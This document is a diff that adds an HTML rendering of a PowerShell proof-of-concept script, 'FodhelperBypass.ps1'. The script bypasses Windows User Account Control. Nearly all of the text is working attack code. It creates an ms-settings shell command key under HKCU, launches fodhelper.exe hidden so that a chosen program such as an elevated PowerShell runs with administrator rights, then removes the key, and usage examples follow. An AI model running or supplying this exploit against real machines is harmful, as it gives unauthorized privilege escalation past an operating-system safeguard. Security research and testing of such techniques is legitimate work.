@@ -1,0 +1,56 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>FodhelperBypass.ps1</title>
+</head><body>&lt;#<br/>
+.SYNOPSIS <br/>
+  This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe<br/>
+<br/>
+  It creates a new registry structure in: &quot;HKCU:\Software\Classes\ms-settings\&quot; to perform an UAC bypass to start any application. <br/>
+  <br/>
+  ATTENTION: Do not try this on your productive machine! <br/>
+<br/>
+<br/>
+.NOTES <br/>
+  Function  : FodhelperBypass<br/>
+  File Name : FodhelperBypass.ps1 <br/>
+  Author   : Christian B. - winscripting.blog <br/>
+<br/>
+<br/>
+.LINK <br/>
+    <br/>
+  https://github.com/winscripting/UAC-bypass<br/>
+<br/>
+.EXAMPLE <br/>
+<br/>
+  Load &quot;cmd.exe /c powershell.exe&quot; (it's default):<br/>
+  FodhelperBypass <br/>
+<br/>
+  Load specific application:<br/>
+  FodhelperBypass -program &quot;cmd.exe&quot;<br/>
+  FodhelperBypass -program &quot;cmd.exe /c powershell.exe&quot;<br/>
+  <br/>
+<br/>
+#&gt;<br/>
+<br/>
+function FodhelperBypass(){ <br/>
+Param (<br/>
+     <br/>
+    [String]$program = &quot;cmd /c start powershell.exe&quot; #default<br/>
+   )<br/>
+<br/>
+  #Create registry structure<br/>
+  New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force<br/>
+  New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force<br/>
+  Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value $program -Force<br/>
+<br/>
+  #Perform the bypass<br/>
+  Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot; -WindowStyle Hidden<br/>
+<br/>
+  #Remove registry structure<br/>
+  Start-Sleep 3<br/>
+  Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force<br/>
+<br/>
+}<br/>
+<br/>
+</body></html>
